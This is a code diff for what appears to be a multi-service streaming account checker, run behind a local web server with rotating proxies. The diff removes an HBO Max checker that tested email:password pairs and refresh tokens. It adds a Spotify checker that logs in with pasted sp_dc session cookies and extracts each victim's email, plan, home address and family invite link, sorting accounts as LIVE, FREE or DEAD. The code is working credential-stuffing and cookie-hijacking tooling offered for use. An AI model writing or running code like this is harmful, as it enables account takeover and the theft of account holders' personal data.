@@ -15,6 +15,8 @@ import urllib.parse
 import urllib.request
 import urllib.error
 from datetime import datetime
+import concurrent.futures
+import platform
 import requests
 from urllib3.exceptions import InsecureRequestWarning
 
@@ -478,7 +480,6 @@ def proxy_health_worker():
     while True:
         all_p = load_proxies()
         good = []
-        import concurrent.futures
         def _bg_test(p):
             ok, lat = check_proxy_health(p)
             if ok:
@@ -501,7 +502,6 @@ def proxy_health_worker():
 def test_all_proxies_now():
     global healthy_proxies, all_tested_proxies
     all_p = load_proxies()
-    import concurrent.futures
     def _test_single(p):
         ok, lat = check_proxy_health(p)
         if ok:
@@ -1448,525 +1448,265 @@ def check_crunchyroll_account(email, password, use_proxy=True):
     return result
 
 
+
 # ══════════════════════════════════════════════════════════════════════════════
-# HBO Max (Max) Account Checker (Comet API reverse-engineered flow)
+# Spotify Cookie Checker (sp_dc cookie → account overview + profile + family)
 # ══════════════════════════════════════════════════════════════════════════════
 
-import uuid as _uuid_mod
-import base64
+SPOTIFY_PLAN_MAP = {
+    'duo_premium': 'Duo Premium',
+    'family_premium_v2': 'Family Premium',
+    'family_basic': 'Family Basic',
+    'premium': 'Premium',
+    'premium_mini': 'Premium Mini',
+    'basic_premium': 'Premium Basic',
+    'student_premium': 'Student Premium',
+    'student_premium_hulu': 'Student Premium (Hulu)',
+    'free': 'Free',
+}
 
-HBO_CLIENT_ID = "585b02c8-dbe1-432f-b1bb-11cf670fbeb0"
-HBO_CLIENT_SECRET = "585b02c8-dbe1-432f-b1bb-11cf670fbeb0"
-HBO_TOKEN_URL = "https://comet.api.hbo.com/tokens"
-
-HBO_BASE_HDRS = {
-    "X-Hbo-Client-Version": "Hadron/50.3.0.362",
-    "Accept": "application/vnd.hbo.v9.full+json",
-    "Content-Type": "application/json",
-    "X-Hbo-Device-Name": "desktop",
-    "X-Hbo-Device-Os-Version": "undefined",
-    "Origin": "https://play.max.com",
-    "Referer": "https://play.max.com/",
-    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+SPOTIFY_HEADERS = {
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+    'Accept-Language': 'en-US,en;q=0.5',
 }
 
 
-def _hbo_decode_jwt(token):
-    """Decode the middle segment of a JWT (base64url) and return the payload dict."""
-    try:
-        parts = token.split(".")
-        if len(parts) < 2:
-            return {}
-        payload = parts[1]
-        # Fix padding
-        payload += "=" * (4 - len(payload) % 4)
-        decoded = base64.urlsafe_b64decode(payload)
-        return json.loads(decoded)
-    except Exception:
-        return {}
+def extract_spotify_sp_dc(cookie_text):
+    """Parse sp_dc from Netscape .txt, JSON array, or raw sp_dc=XXX string."""
+    if not cookie_text:
+        return None
 
+    text = str(cookie_text).strip()
 
-def check_hbomax_token(token_text, use_proxy=True):
-    """Check an HBO Max / Max account via access_token, refresh_token, or Netscape cookie jar.
-    Accepts: raw JWT access_token, refresh_token, 'access_token=...' format, or Netscape cookie format."""
-    proxy_url = None
-    proxy_label = "Direct"
-    if use_proxy:
-        prx, label, raw_url = get_random_proxy()
-        if prx:
-            proxy_url = prx.get("http") or prx.get("https")
-            proxy_label = label or "Proxy"
-
-    route = f"Proxy ({proxy_label})" if use_proxy and proxy_label != "Direct" else "Direct"
-    proxies = {"http": proxy_url, "https": proxy_url} if proxy_url else None
-
-    token_text = token_text.strip()
-    # Strip comment lines ($ prefixed lines from dump files)
-    cleaned_lines = [l for l in token_text.split("\n") if l.strip() and not l.strip().startswith("$") and not l.strip().startswith("#") and l.strip() != "=" * len(l.strip())]
-    cleaned_text = "\n".join(cleaned_lines).strip()
-
-    access_token = ""
-    refresh_token = ""
-    cookie_profile_id = ""
-    cookie_country = ""
-    cookie_session_info = ""
-    input_format = "unknown"
-
-    # --- Detect Netscape cookie format (tab-separated, domain starts with . or hostname) ---
-    is_netscape = False
-    netscape_cookies = {}
-    for line in cleaned_lines:
-        parts = line.strip().split("\t")
-        if len(parts) >= 7:
-            is_netscape = True
-            domain = parts[0].strip()
-            name = parts[5].strip()
-            value = parts[6].strip()
-            netscape_cookies[name] = value
-
-    if is_netscape and netscape_cookies:
-        input_format = "netscape_cookies"
-        # Extract the st cookie (JWT access token from FPA issuer)
-        st_token = netscape_cookies.get("st", "")
-        if st_token and st_token.count(".") == 2:
-            access_token = st_token
-
-        # Extract useful metadata from cookies
-        cookie_country = netscape_cookies.get("countryCode", "") or netscape_cookies.get("usr_country", "")
-
-        # Extract profileId from wbd-profile-context cookie
-        wbd_ctx = netscape_cookies.get("wbd-profile-context", "")
-        if wbd_ctx:
-            try:
-                ctx_data = json.loads(wbd_ctx)
-                cookie_profile_id = ctx_data.get("profileId", "")
-            except Exception:
-                pass
-
-        # Extract session info
-        session_ck = netscape_cookies.get("session", "")
-        if session_ck:
-            try:
-                sess_data = json.loads(session_ck)
-                if sess_data.get("expires"):
-                    from datetime import datetime as _dt
-                    cookie_session_info = _dt.fromtimestamp(sess_data["expires"] / 1000).strftime("%Y-%m-%d %H:%M:%S") if sess_data["expires"] > 1e10 else _dt.fromtimestamp(sess_data["expires"]).strftime("%Y-%m-%d %H:%M:%S")
-            except Exception:
-                pass
-
-        if not access_token:
-            # No st cookie — look for any JWT in cookie values
-            for ck_name, ck_val in netscape_cookies.items():
-                if ck_val.startswith("eyJ") and ck_val.count(".") == 2:
-                    access_token = ck_val
-                    break
-
-    if not is_netscape:
-        # --- Try key=value parsing ---
-        for line in cleaned_text.replace(";", "\n").replace("&", "\n").split("\n"):
-            line = line.strip()
-            if "=" in line:
-                k, v = line.split("=", 1)
-                k = k.strip().lower()
-                v = v.strip()
-                if k == "access_token":
-                    access_token = v
-                    input_format = "key_value"
-                elif k == "refresh_token":
-                    refresh_token = v
-                    input_format = "key_value"
-
-        # If no key=value found, check if it's a raw JWT or plain token
-        if not access_token and not refresh_token:
-            if cleaned_text.count(".") == 2 and cleaned_text.startswith("eyJ"):
-                access_token = cleaned_text
-                input_format = "jwt"
-            elif len(cleaned_text) > 20:
-                refresh_token = cleaned_text
-                input_format = "refresh_token"
-
-    # If we have a refresh_token but no access_token, exchange it
-    if refresh_token and not access_token:
+    # 1. JSON array format [{"name":"sp_dc","value":"xxx"}, ...]
+    json_match = re.search(r'\[\s*\{[\s\S]*?\}\s*\]', text)
+    if json_match:
         try:
-            session = requests.Session()
-            session.verify = False
-            session.headers.update(HBO_BASE_HDRS)
-            if proxies:
-                session.proxies = proxies
-
-            device_serial = str(_uuid_mod.uuid4())
-            step1_body = {
-                "client_id": HBO_CLIENT_ID,
-                "client_secret": HBO_CLIENT_SECRET,
-                "scope": "browse video_playback_free",
-                "grant_type": "client_credentials",
-                "deviceSerialNumber": device_serial,
-                "clientDeviceData": {"paymentProviderCode": "blackmarket"}
-            }
-            r1 = session.post(HBO_TOKEN_URL, json=step1_body, timeout=20)
-            if r1.status_code != 200:
-                save_history("hbomax", "ERROR", route=route, raw_cookie=token_text[:200])
-                return {"status": "ERROR", "reason": f"Client auth failed ({r1.status_code})", "route": route, "mode": "token", "input_format": input_format}
-            client_token = r1.json().get("access_token", "")
-
-            session.headers["Authorization"] = f"Bearer {client_token}"
-            refresh_body = {
-                "grant_type": "refresh_token",
-                "refresh_token": refresh_token,
-                "scope": "browse video_playback device elevated_account_management"
-            }
-            r2 = session.post(HBO_TOKEN_URL, json=refresh_body, timeout=20)
-            r2_text = r2.text.lower()
-
-            if r2.status_code == 403 or "geo" in r2_text:
-                save_history("hbomax", "ERROR", route=route, raw_cookie=token_text[:200])
-                return {"status": "ERROR", "reason": "Geo-blocked / IP blocked by HBO", "route": route, "mode": "token", "input_format": input_format}
-
-            if r2.status_code in (401, 400) or "invalid" in r2_text or "expired" in r2_text:
-                save_history("hbomax", "DEAD", route=route, raw_cookie=token_text[:200])
-                return {"status": "DEAD", "reason": "Token expired atau tidak valid", "route": route, "mode": "token", "input_format": input_format}
-
-            r2_data = r2.json()
-            access_token = r2_data.get("access_token", "")
-            if not access_token:
-                save_history("hbomax", "DEAD", route=route, raw_cookie=token_text[:200])
-                return {"status": "DEAD", "reason": "Refresh gagal — tidak ada access_token baru", "route": route, "mode": "token", "input_format": input_format}
-
-            session.close()
-        except requests.exceptions.RequestException as e:
-            save_history("hbomax", "ERROR", route=route, raw_cookie=token_text[:200])
-            return {"status": "ERROR", "reason": f"Refresh request gagal: {str(e)[:100]}", "route": route, "mode": "token", "input_format": input_format}
-
-    if not access_token:
-        save_history("hbomax", "ERROR", route=route, raw_cookie=token_text[:200])
-        return {"status": "ERROR", "reason": "Tidak ada access_token, st cookie, atau refresh_token yang valid", "route": route, "mode": "token", "input_format": input_format}
-
-    # Decode JWT payload
-    jwt_payload = _hbo_decode_jwt(access_token)
-
-    # Check if token is expired
-    exp_ts = jwt_payload.get("exp", 0)
-    import time as _time_mod
-    if exp_ts and exp_ts < _time_mod.time():
-        if not refresh_token:
-            save_history("hbomax", "DEAD", route=route, raw_cookie=token_text[:200])
-            return {"status": "DEAD", "reason": "Access token sudah expired. Paste refresh_token untuk renew.", "route": route, "mode": "token", "input_format": input_format}
-
-    # Extract subscription info from JWT
-    jwt_sub = jwt_payload.get("sub", "")
-    email = jwt_payload.get("email", "") or ""
-    # Parse USERID from sub field (e.g., "USERID:bolt:e27c1e8d-...")
-    user_id = ""
-    if jwt_sub.startswith("USERID:"):
-        user_id = jwt_sub.split(":", 2)[-1] if jwt_sub.count(":") >= 2 else jwt_sub
-    else:
-        user_id = jwt_payload.get("userId", "") or jwt_payload.get("profileId", "") or jwt_sub
-
-    sub_tier = jwt_payload.get("subscriptionTier", "") or jwt_payload.get("tier", "") or ""
-    country = jwt_payload.get("territory", "") or jwt_payload.get("country", "") or cookie_country or ""
-    entitlements = jwt_payload.get("entitlements", []) or []
-    service_code = jwt_payload.get("serviceCode", "") or ""
-    product_code = jwt_payload.get("productCode", "") or ""
-    token_type = jwt_payload.get("type", "") or ""
-    subdivision = jwt_payload.get("subdivision", "") or ""
-    device_id = jwt_payload.get("deviceId", "") or ""
-    is_anonymous = jwt_payload.get("anonymous", True)
-    profile_id = cookie_profile_id or jwt_payload.get("profileId", "") or ""
-
-    # Determine plan — try API call first for FPA tokens (they don't carry subscription info in JWT)
-    plan = ""
-    profiles_count = 0
-    api_subscription = {}
-
-    # Use st token to query comet API for actual subscription/entitlements
-    try:
-        val_session = requests.Session()
-        val_session.verify = False
-        val_session.headers.update(HBO_BASE_HDRS)
-        val_session.headers["Authorization"] = f"Bearer {access_token}"
-        if proxies:
-            val_session.proxies = proxies
-
-        # Try to get user & subscription info from sessions/active endpoint
-        # This uses the comet API to check entitlements
-        sessions_url = "https://comet.api.hbo.com/sessions"
-        sr = val_session.get(sessions_url, timeout=15)
-        if sr.status_code == 200:
-            sr_data = sr.json()
-            # Extract subscription details from session response
-            if isinstance(sr_data, dict):
-                for key in ("subscriptionTier", "tier", "package", "productCode"):
-                    if sr_data.get(key):
-                        sub_tier = sub_tier or str(sr_data[key])
-                # Check for entitlements array
-                ent = sr_data.get("entitlements", [])
-                if ent:
-                    entitlements = ent
-
-        # Try profiles endpoint
-        pr = val_session.get("https://profiles.api.hbo.com/profiles", timeout=10)
-        if pr.status_code == 200:
-            pr_data = pr.json()
-            if isinstance(pr_data, list):
-                profiles_count = len(pr_data)
-                # Try to find email from profile
-                for p in pr_data:
-                    if isinstance(p, dict):
-                        em = p.get("email", "") or p.get("emailAddress", "")
-                        if em:
-                            email = email or em
-                            break
-            elif isinstance(pr_data, dict):
-                profiles_list = pr_data.get("profiles", pr_data.get("items", []))
-                profiles_count = len(profiles_list)
-                for p in profiles_list:
-                    if isinstance(p, dict):
-                        em = p.get("email", "") or p.get("emailAddress", "")
-                        if em:
-                            email = email or em
-                            break
-        elif pr.status_code in (401, 403):
-            pass  # Token might be FPA-scoped, doesn't mean it's dead
-
-        # Try express-content to check if user has entitlements
-        ent_url = "https://comet.api.hbo.com/express-content/urn:hbo:page:home?device-code=desktop&product-code=hboMax&api-version=v9.0&signed-in=true"
-        er = val_session.get(ent_url, timeout=10)
-        if er.status_code == 200:
-            er_data = er.json()
-            # If we get content back, user has valid access
-            if isinstance(er_data, (list, dict)):
-                if not sub_tier:
-                    sub_tier = "active"
-
-        val_session.close()
-    except Exception:
-        pass
-
-    # Determine plan from collected info
-    if not plan:
-        if sub_tier:
-            tier_lower = sub_tier.lower()
-            if "ultimate" in tier_lower or "platinum" in tier_lower:
-                plan = "Max Ultimate Ad-Free"
-            elif "ad_free" in tier_lower or "adfree" in tier_lower or "premium" in tier_lower:
-                plan = "Max Ad-Free"
-            elif "ads" in tier_lower or "with_ads" in tier_lower or "basic" in tier_lower:
-                plan = "Max With Ads"
-            elif tier_lower == "active":
-                plan = "Max (Active Subscription)"
-            else:
-                plan = f"Max {sub_tier.replace('_', ' ').title()}"
-        elif entitlements:
-            ent_str = " ".join(str(e) for e in entitlements).lower()
-            if "hbo" in ent_str or "max" in ent_str:
-                plan = "Max (Active)"
-            else:
-                plan = "Max (Entitlements Found)"
-        else:
-            plan = "Max (Free / No Subscription)"
-
-    # Determine status
-    has_sub = bool(sub_tier) or bool(entitlements)
-    if has_sub and not is_anonymous:
-        status = "LIVE"
-    elif not is_anonymous and (user_id or profile_id):
-        status = "HOLD"
-    elif is_anonymous:
-        status = "DEAD"
-    else:
-        status = "HOLD"
-
-    # Format expiry
-    exp_date = ""
-    if exp_ts:
-        try:
-            from datetime import datetime as _dt
-            exp_date = _dt.fromtimestamp(exp_ts).strftime("%Y-%m-%d %H:%M:%S")
+            parsed = json.loads(json_match.group(0))
+            if isinstance(parsed, list):
+                for c in parsed:
+                    if isinstance(c, dict):
+                        n = c.get("name", "")
+                        v = c.get("value", "")
+                        if n == "sp_dc" and v:
+                            return v
         except Exception:
             pass
 
-    country_name = normalize_country(country) if country and len(country) == 2 else (country or "N/A")
+    # 2. Netscape format (tab-separated)
+    for raw_line in text.splitlines():
+        line = raw_line.strip()
+        if not line or line.startswith("#"):
+            continue
+        parts = line.split("\t")
+        if len(parts) >= 7 and parts[5] == "sp_dc":
+            return parts[6]
 
-    save_history("hbomax", status, plan=plan, billing=exp_date,
-                 country=country_name, route=route,
-                 raw_cookie=token_text[:200], email=email)
+    # 3. Raw string: sp_dc=XXXXXX or sp_dc=XXXXXX; sp_key=YYYYYY
+    m = re.search(r'(?:^|[;\s])sp_dc=([^\s;,]+)', text)
+    if m:
+        return m.group(1)
 
-    return {
-        "status": status,
-        "email": email or "N/A",
-        "plan": plan,
-        "country": country_name,
-        "tier": sub_tier or "N/A",
-        "token_expiry": exp_date,
-        "user_id": user_id or "N/A",
-        "profile_id": profile_id or "N/A",
-        "profiles": profiles_count if profiles_count else "N/A",
-        "service": service_code or product_code or token_type or "N/A",
-        "subdivision": subdivision or "N/A",
-        "device_id": device_id or "N/A",
-        "session_expires": cookie_session_info or "N/A",
-        "has_refresh_token": bool(refresh_token),
-        "route": route,
-        "mode": "token",
-        "input_format": input_format,
-    }
+    # 4. If text is just a raw token value (no = sign, long alphanum), treat as sp_dc value
+    if len(text) > 50 and not any(c in text for c in ('=', '\t', '{', '[')):
+        return text
+
+    return None
 
 
-def check_hbomax_account(email, password, use_proxy=True):
-    """Check an HBO Max / Max account via Comet API. Returns dict with status/details."""
-    proxy_url = None
-    proxy_label = "Direct"
+def check_spotify_cookie(cookie_text, use_proxy=True):
+    """Check a Spotify account using sp_dc cookie."""
+    sp_dc = extract_spotify_sp_dc(cookie_text)
+    if not sp_dc:
+        save_history("spotify", "DEAD", raw_cookie=cookie_text)
+        return {"status": "DEAD", "reason": "sp_dc cookie not found in input."}
+
+    route = "Direct"
+    proxies = None
+    proxy_raw_url = None
+
     if use_proxy:
-        prx, label, raw_url = get_random_proxy()
-        if prx:
-            proxy_url = prx.get("http") or prx.get("https")
-            proxy_label = label or "Proxy"
-
-    route = f"Proxy ({proxy_label})" if use_proxy and proxy_label != "Direct" else "Direct"
-    proxies = {"http": proxy_url, "https": proxy_url} if proxy_url else None
-    device_serial = str(_uuid_mod.uuid4())
+        proxy_result = get_random_proxy()
+        if proxy_result and proxy_result[0]:
+            proxies = proxy_result[0]
+            route = f"Proxy ({proxy_result[1]})" if proxy_result[1] else "Proxy"
+            proxy_raw_url = proxy_result[2]
 
     session = requests.Session()
     session.verify = False
-    session.headers.update(HBO_BASE_HDRS)
+    session.headers.update(SPOTIFY_HEADERS)
+    session.cookies.set("sp_dc", sp_dc, domain=".spotify.com")
+
     if proxies:
         session.proxies = proxies
 
-    # Step 1: Client credentials token
-    try:
-        step1_body = {
-            "client_id": HBO_CLIENT_ID,
-            "client_secret": HBO_CLIENT_SECRET,
-            "scope": "browse video_playback_free",
-            "grant_type": "client_credentials",
-            "deviceSerialNumber": device_serial,
-            "clientDeviceData": {
-                "paymentProviderCode": "blackmarket"
-            }
-        }
-        r1 = session.post(HBO_TOKEN_URL, json=step1_body, timeout=20)
-
-        if r1.status_code == 403 or "geo" in r1.text.lower():
-            save_history("hbomax", "ERROR", route=route, raw_cookie=f"{email}:{password}", email=email)
-            return {"status": "ERROR", "reason": "Geo-blocked / IP blocked by HBO", "route": route}
-
-        if r1.status_code != 200:
-            save_history("hbomax", "ERROR", route=route, raw_cookie=f"{email}:{password}", email=email)
-            return {"status": "ERROR", "reason": f"Client auth failed ({r1.status_code})", "route": route}
-
-        r1_data = r1.json()
-        client_token = r1_data.get("access_token")
-        if not client_token:
-            save_history("hbomax", "ERROR", route=route, raw_cookie=f"{email}:{password}", email=email)
-            return {"status": "ERROR", "reason": "No client access_token returned", "route": route}
-
-    except requests.exceptions.RequestException as e:
-        save_history("hbomax", "ERROR", route=route, raw_cookie=f"{email}:{password}", email=email)
-        return {"status": "ERROR", "reason": f"Client auth request failed: {str(e)[:100]}", "route": route}
-
-    # Step 2: User login
-    try:
-        session.headers["Authorization"] = f"Bearer {client_token}"
-        step2_body = {
-            "scope": "browse video_playback device elevated_account_management",
-            "grant_type": "user_name_password",
-            "username": email,
-            "password": password
-        }
-        r2 = session.post(HBO_TOKEN_URL, json=step2_body, timeout=20)
-        r2_text = r2.text.lower()
-
-        if r2.status_code == 401 or "incorrect" in r2_text or "invalid" in r2_text:
-            save_history("hbomax", "BAD", route=route, raw_cookie=f"{email}:{password}", email=email)
-            return {"status": "BAD", "reason": "Wrong password or account not found", "route": route}
-
-        if r2.status_code == 403 or "geo" in r2_text:
-            save_history("hbomax", "ERROR", route=route, raw_cookie=f"{email}:{password}", email=email)
-            return {"status": "ERROR", "reason": "Geo-blocked / IP blocked", "route": route}
-
-        if r2.status_code == 429:
-            save_history("hbomax", "ERROR", route=route, raw_cookie=f"{email}:{password}", email=email)
-            return {"status": "ERROR", "reason": "Rate limited (429)", "route": route}
-
-        r2_data = r2.json()
-
-        is_logged_in = r2_data.get("isUserLoggedIn", False)
-        user_token = r2_data.get("access_token", "")
-        refresh_token = r2_data.get("refresh_token", "")
-
-        if not is_logged_in and not user_token:
-            # Check for specific error messages
-            err_msg = r2_data.get("message", "") or r2_data.get("error_description", "") or ""
-            if "incorrect" in err_msg.lower() or "invalid" in err_msg.lower():
-                save_history("hbomax", "BAD", route=route, raw_cookie=f"{email}:{password}", email=email)
-                return {"status": "BAD", "reason": "Wrong password or account not found", "route": route}
-            save_history("hbomax", "ERROR", route=route, raw_cookie=f"{email}:{password}", email=email)
-            return {"status": "ERROR", "reason": f"Login failed: {err_msg or r2.status_code}", "route": route}
-
-    except requests.exceptions.RequestException as e:
-        save_history("hbomax", "ERROR", route=route, raw_cookie=f"{email}:{password}", email=email)
-        return {"status": "ERROR", "reason": f"Login request failed: {str(e)[:100]}", "route": route}
-
-    session.close()
-
-    # Parse JWT for subscription info
-    plan = "Max (Free)"
-    country = ""
-    sub_tier = ""
-    exp_date = ""
-
-    if user_token:
-        jwt_payload = _hbo_decode_jwt(user_token)
-        # Extract subscription info from JWT claims
-        sub_tier = jwt_payload.get("subscriptionTier", "") or jwt_payload.get("tier", "") or ""
-        country = jwt_payload.get("territory", "") or jwt_payload.get("country", "") or ""
-        exp_ts = jwt_payload.get("exp", 0)
-
-        # Parse plan from token claims
-        entitlements = jwt_payload.get("entitlements", []) or []
-        package_names = jwt_payload.get("packages", []) or []
-
-        if sub_tier:
-            tier_lower = sub_tier.lower()
-            if "ultimate" in tier_lower or "platinum" in tier_lower:
-                plan = "Max Ultimate Ad-Free"
-            elif "ad_free" in tier_lower or "adfree" in tier_lower or "premium" in tier_lower:
-                plan = "Max Ad-Free"
-            elif "ads" in tier_lower or "with_ads" in tier_lower or "basic" in tier_lower:
-                plan = "Max With Ads"
-            else:
-                plan = f"Max {sub_tier.replace('_', ' ').title()}"
-        elif entitlements:
-            ent_str = " ".join(str(e) for e in entitlements).lower()
-            if "hbo" in ent_str or "max" in ent_str:
-                plan = "Max (Active)"
-
-        if exp_ts:
-            try:
-                from datetime import datetime as _dt
-                exp_date = _dt.fromtimestamp(exp_ts).strftime("%Y-%m-%d %H:%M:%S")
-            except Exception:
-                pass
-
-    country_name = normalize_country(country) if country and len(country) == 2 else (country or "N/A")
-    status = "LIVE"
-
-    # Save to history
-    plan_str = plan
-    save_history("hbomax", status, plan=plan_str, billing=exp_date,
-                 country=country_name, route=route,
-                 raw_cookie=f"{email}:{password}", email=email)
-
-    return {
-        "status": status,
-        "email": email,
-        "plan": plan,
-        "country": country_name,
-        "tier": sub_tier,
-        "token_expiry": exp_date,
-        "has_refresh_token": bool(refresh_token),
+    result = {
+        "status": "DEAD",
+        "plan": "",
+        "email": "",
+        "country": "",
+        "is_owner": None,
+        "free_slots": None,
+        "invite_link": "",
+        "address": "",
+        "is_child_account": False,
+        "next_payment_date": "",
         "route": route,
     }
+
+    try:
+        # Step 1: Account overview page
+        r = session.get("https://www.spotify.com/us/account/overview/", timeout=15, allow_redirects=True)
+
+        if r.status_code in (403, 429) and proxy_raw_url:
+            mark_proxy_cooldown(proxy_raw_url, 600)
+
+        if "login" in r.url.lower() or r.status_code in (401, 403):
+            session.close()
+            save_history("spotify", "DEAD", route=route, raw_cookie=cookie_text)
+            return {"status": "DEAD", "reason": "Cookie expired / redirected to login.", "route": route}
+
+        html = r.text
+
+        # Parse plan from overview page reactContext / JSON state
+        plan_raw = ""
+        plan_match = re.search(r'"currentPlan"\s*:\s*"([^"]+)"', html)
+        if not plan_match:
+            plan_match = re.search(r'"plan"\s*:\s*"([^"]+)"', html)
+        if not plan_match:
+            plan_match = re.search(r'"productName"\s*:\s*"([^"]+)"', html)
+        if plan_match:
+            plan_raw = plan_match.group(1).strip()
+
+        plan_name = SPOTIFY_PLAN_MAP.get(plan_raw.lower(), plan_raw.replace('_', ' ').title() if plan_raw else '')
+
+        # loggedIn check
+        logged_in = bool(re.search(r'"isLoggedIn"\s*:\s*true', html, re.I))
+        if not logged_in:
+            logged_in = bool(re.search(r'"loggedIn"\s*:\s*true', html, re.I))
+
+        # country
+        country_match = re.search(r'"country"\s*:\s*"([A-Za-z]{2})"', html)
+        country = normalize_country(country_match.group(1)) if country_match else ""
+
+        # isRecurring
+        is_recurring_match = re.search(r'"isRecurring"\s*:\s*(true|false)', html, re.I)
+        is_recurring = is_recurring_match.group(1).lower() == 'true' if is_recurring_match else None
+
+        # isMaster / isSubAccount
+        is_master_match = re.search(r'"isMaster"\s*:\s*(true|false)', html, re.I)
+        is_master = is_master_match.group(1).lower() == 'true' if is_master_match else None
+
+        is_sub_match = re.search(r'"isSubAccount"\s*:\s*(true|false)', html, re.I)
+        is_sub_account = is_sub_match.group(1).lower() == 'true' if is_sub_match else False
+
+        # freeSlots
+        free_slots_match = re.search(r'"freeSlots"\s*:\s*(\d+)', html)
+        free_slots = int(free_slots_match.group(1)) if free_slots_match else None
+
+        # inviteLink
+        invite_match = re.search(r'"inviteLink"\s*:\s*"([^"]+)"', html)
+        invite_link = invite_match.group(1) if invite_match else ""
+
+        # address
+        address_match = re.search(r'"address"\s*:\s*"([^"]+)"', html)
+        address = address_match.group(1) if address_match else ""
+
+        # nextPaymentDate
+        payment_match = re.search(r'"nextPaymentDate"\s*:\s*"([^"]+)"', html)
+        if not payment_match:
+            payment_match = re.search(r'"nextBillingInfo"\s*:\s*"([^"]+)"', html)
+        next_payment = payment_match.group(1) if payment_match else ""
+
+        # Step 2: Profile API for email & country
+        try:
+            r2 = session.get("https://www.spotify.com/api/account-settings/v1/profile", timeout=12)
+            if r2.status_code == 200:
+                prof = r2.json()
+                result["email"] = prof.get("email", "") or prof.get("username", "")
+                if not country and prof.get("country"):
+                    country = normalize_country(prof["country"])
+        except Exception:
+            pass
+
+        # Step 3: Family API for family details
+        family_members = []
+        family_max = None
+        try:
+            r3 = session.get("https://www.spotify.com/api/family/v1/family/home", timeout=12)
+            if r3.status_code == 200:
+                fam = r3.json()
+                family_members = fam.get("members", [])
+                family_max = fam.get("maxCapacity")
+                if fam.get("inviteToken") and not invite_link:
+                    invite_link = f"https://www.spotify.com/family/join/invite/{fam['inviteToken']}"
+                if fam.get("address") and not address:
+                    addr_obj = fam["address"]
+                    if isinstance(addr_obj, dict):
+                        parts = [addr_obj.get("street", ""), addr_obj.get("city", ""),
+                                 addr_obj.get("state", ""), addr_obj.get("postalCode", ""),
+                                 addr_obj.get("country", "")]
+                        address = ", ".join(p for p in parts if p)
+                    elif isinstance(addr_obj, str):
+                        address = addr_obj
+                if is_master is None and family_members:
+                    # determine if current user is owner
+                    for mem in family_members:
+                        if mem.get("isOwner") and mem.get("email") == result.get("email"):
+                            is_master = True
+                            break
+                if free_slots is None and family_max is not None:
+                    free_slots = max(0, family_max - len(family_members))
+        except Exception:
+            pass
+
+        session.close()
+
+        # Determine status
+        if not logged_in and not plan_raw and not result["email"]:
+            status = "DEAD"
+        elif plan_raw.lower() == 'free' or not plan_raw:
+            status = "FREE"
+            if not plan_name:
+                plan_name = "Free"
+        else:
+            status = "LIVE"
+
+        result.update({
+            "status": status,
+            "plan": plan_name,
+            "country": country,
+            "is_owner": is_master,
+            "is_child_account": is_sub_account,
+            "free_slots": free_slots,
+            "invite_link": invite_link,
+            "address": address,
+            "next_payment_date": next_payment,
+            "is_recurring": is_recurring,
+            "family_members": len(family_members) if family_members else 0,
+            "family_max_capacity": family_max,
+        })
+
+        # Save to history
+        billing = ""
+        if next_payment:
+            billing = f"Next: {next_payment}"
+            if is_recurring:
+                billing += " [Auto-renew]"
+        elif is_recurring is False:
+            billing = "Not recurring"
+
+        save_history("spotify", status, plan=f"Spotify {plan_name}" if plan_name else "",
+                     billing=billing, country=country, route=route,
+                     raw_cookie=cookie_text, email=result.get("email", ""))
+
+        return result
+
+    except Exception as e:
+        session.close()
+        save_history("spotify", "ERROR", route=route, raw_cookie=cookie_text)
+        return {"status": "ERROR", "reason": f"Request failed: {str(e)[:150]}", "route": route}
 
 
 # In-memory sliding window rate limiter
@@ -2003,6 +1743,16 @@ class Handler(http.server.BaseHTTPRequestHandler):
     def log_message(self, format, *args):
         pass
 
+    def send_cors_headers(self):
+        self.send_header('Access-Control-Allow-Origin', '*')
+        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
+        self.send_header('Access-Control-Allow-Headers', 'Content-Type, X-Suite-Pin, Authorization')
+
+    def do_OPTIONS(self):
+        self.send_response(204)
+        self.send_cors_headers()
+        self.end_headers()
+
     def do_HEAD(self):
         parsed = urllib.parse.urlparse(self.path)
         path = parsed.path
@@ -2034,8 +1784,10 @@ class Handler(http.server.BaseHTTPRequestHandler):
                 content = b"<h1>index.html not found</h1>"
             self.send_response(200)
             self.send_header("Content-Type", "text/html; charset=utf-8")
+            self.send_header("Content-Security-Policy", "default-src 'self' 'unsafe-inline' 'unsafe-eval' https://fonts.googleapis.com https://fonts.gstatic.com https://cdn.jsdelivr.net; img-src 'self' data:; connect-src 'self'")
             self.send_header("X-Content-Type-Options", "nosniff")
             self.send_header("X-Frame-Options", "DENY")
+            self.send_cors_headers()
             self.end_headers()
             self.wfile.write(content)
 
@@ -2045,6 +1797,7 @@ class Handler(http.server.BaseHTTPRequestHandler):
                 h_proxies = len(healthy_proxies)
             self.send_response(200)
             self.send_header("Content-Type", "application/json")
+            self.send_cors_headers()
             self.end_headers()
             res = {
                 "status": "healthy",
@@ -2058,6 +1811,7 @@ class Handler(http.server.BaseHTTPRequestHandler):
             cfg = get_config()
             self.send_response(200)
             self.send_header("Content-Type", "application/json")
+            self.send_cors_headers()
             self.end_headers()
             self.wfile.write(json.dumps({"enabled": bool(cfg.get("pin"))}).encode("utf-8"))
 
@@ -2067,13 +1821,28 @@ class Handler(http.server.BaseHTTPRequestHandler):
                 h_count = len(healthy_proxies) if all_tested_proxies else len(all_p)
             self.send_response(200)
             self.send_header("Content-Type", "application/json")
+            self.send_cors_headers()
             self.end_headers()
             self.wfile.write(json.dumps({"total": len(all_p), "healthy": h_count}).encode("utf-8"))
+
+        elif path == '/api/version':
+            self.send_response(200)
+            self.send_header('Content-Type', 'application/json')
+            self.send_cors_headers()
+            self.end_headers()
+            self.wfile.write(json.dumps({
+                'version': '7.0.0',
+                'codename': 'Ultra',
+                'services': ['netflix', 'disney', 'crunchyroll', 'expressvpn', 'spotify'],
+                'python': platform.python_version(),
+                'uptime': int(time.time() - server_start_time)
+            }).encode('utf-8'))
 
         elif path in ("/api/history", "/api/history/export_csv", "/api/analytics", "/api/proxies/detail"):
             if not check_pin_authorized(self.headers):
                 self.send_response(401)
                 self.send_header("Content-Type", "application/json")
+                self.send_cors_headers()
                 self.end_headers()
